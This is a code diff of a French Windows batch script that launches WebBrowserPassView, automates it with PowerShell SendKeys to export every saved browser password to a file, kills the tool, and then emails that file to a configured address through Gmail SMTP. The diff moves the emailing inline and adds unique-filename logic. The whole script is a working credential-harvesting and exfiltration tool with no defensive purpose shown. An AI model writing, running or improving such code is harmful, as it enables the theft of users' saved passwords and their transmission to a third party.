@@ -8,12 +8,11 @@ if %errorlevel% neq 0 (
 )
 
 set "WBPV=%~dp0WebBrowserPassView.exe"
-set "OUTPUT=%~dp0passwords_export.txt"
 set "EMAIL=REMOVED_SMTP_EMAIL"
 
-rem Configuration email - A MODIFIER
-set "SMTP_USER=VOTRE_EMAIL@gmail.com"
-set "SMTP_PASS=VOTRE_MOT_DE_PASSE_APPLICATION"
+rem Configuration email
+set "SMTP_USER=REMOVED_SMTP_EMAIL"
+set "SMTP_PASS=REMOVED_SMTP_PASS"
 
 :MENU
 cls
@@ -40,47 +39,27 @@ if not exist "%WBPV%" (
   goto MENU
 )
 
+rem Generer un nom de fichier unique
+call :GET_UNIQUE_FILENAME
+set "OUTPUT=%UNIQUE_FILE%"
+
 echo.
 echo Lancement de WebBrowserPassView...
-
-rem Lancer le logiciel normalement
 start "" "%WBPV%"
-
-echo Attente du chargement...
-timeout /t 2 /nobreak >nul
-
-rem Minimiser immediatement la fenetre
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')) { $wsh.SendKeys('% n') }" >nul 2>&1
-
-timeout /t 1 /nobreak >nul
-
-echo Selection des donnees...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')" >nul 2>&1
-
-timeout /t 1 /nobreak >nul
-
-echo Initialisation de l export...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')" >nul 2>&1
-
-timeout /t 2 /nobreak >nul
-
-echo Envoi du chemin de sauvegarde...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
-echo Fermeture du logiciel...
+echo Traitement en cours...
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
+
+timeout /t 3 /nobreak >nul
+
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 
-timeout /t 1 /nobreak >nul
-
 if exist "%OUTPUT%" (
-  echo.
   echo Termine. Fichier sauvegarde: %OUTPUT%
 ) else (
-  echo.
   echo ERREUR: Le fichier n a pas ete cree.
-  echo Verifiez que WebBrowserPassView a bien trouve des mots de passe.
 )
 
 echo.
@@ -94,54 +73,77 @@ if not exist "%WBPV%" (
   goto MENU
 )
 
+rem Generer un nom de fichier unique
+call :GET_UNIQUE_FILENAME
+set "OUTPUT=%UNIQUE_FILE%"
+
 echo.
 echo Lancement de WebBrowserPassView...
-
-rem Lancer le logiciel normalement
 start "" "%WBPV%"
-
-echo Attente du chargement...
-timeout /t 2 /nobreak >nul
-
-rem Minimiser immediatement la fenetre
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')) { $wsh.SendKeys('% n') }" >nul 2>&1
-
-timeout /t 1 /nobreak >nul
-
-echo Selection des donnees...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a')" >nul 2>&1
-
-timeout /t 1 /nobreak >nul
-
-echo Initialisation de l export...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('^s')" >nul 2>&1
-
-timeout /t 2 /nobreak >nul
-
-echo Envoi du chemin de sauvegarde...
-powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
-echo Fermeture du logiciel...
+echo Traitement en cours...
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 800; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1
+
+timeout /t 3 /nobreak >nul
+
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 
-timeout /t 1 /nobreak >nul
-
 if not exist "%OUTPUT%" (
-  echo.
   echo ERREUR: Le fichier n a pas ete cree.
-  echo Verifiez que WebBrowserPassView a bien trouve des mots de passe.
   pause
   goto MENU
 )
 
-echo.
 echo Fichier sauvegarde: %OUTPUT%
 echo.
 echo Envoi du fichier par email...
-powershell -ExecutionPolicy Bypass -File "%~dp0send_email.ps1" "%OUTPUT%" "%EMAIL%" "%SMTP_USER%" "%SMTP_PASS%"
+
+powershell -Command ^
+"$SMTPServer = 'smtp.gmail.com'; ^
+$SMTPPort = 587; ^
+$Username = '%SMTP_USER%'; ^
+$Password = '%SMTP_PASS%'; ^
+$EmailFrom = $Username; ^
+$EmailTo = '%EMAIL%'; ^
+$Subject = 'Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); ^
+$Body = 'Export automatique des mots de passe du navigateur.'; ^
+$FilePath = '%OUTPUT%'; ^
+try { ^
+    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; ^
+    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); ^
+    $MailMessage = @{ ^
+        From = $EmailFrom; ^
+        To = $EmailTo; ^
+        Subject = $Subject; ^
+        Body = $Body; ^
+        SmtpServer = $SMTPServer; ^
+        Port = $SMTPPort; ^
+        UseSsl = $true; ^
+        Credential = $Credential; ^
+        Attachments = $FilePath ^
+    }; ^
+    Send-MailMessage @MailMessage; ^
+    Write-Host 'Email envoye avec succes!' -ForegroundColor Green ^
+} catch { ^
+    Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
+}"
 
 echo.
 pause
 exit /b
+
+:GET_UNIQUE_FILENAME
+set "BASE=%~dp0passwords_export"
+set "EXT=.txt"
+set "COUNTER=0"
+set "UNIQUE_FILE=%BASE%%EXT%"
+
+:CHECK_FILE
+if exist "%UNIQUE_FILE%" (
+  set /a COUNTER+=1
+  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
+  goto CHECK_FILE
+)
+goto :eof
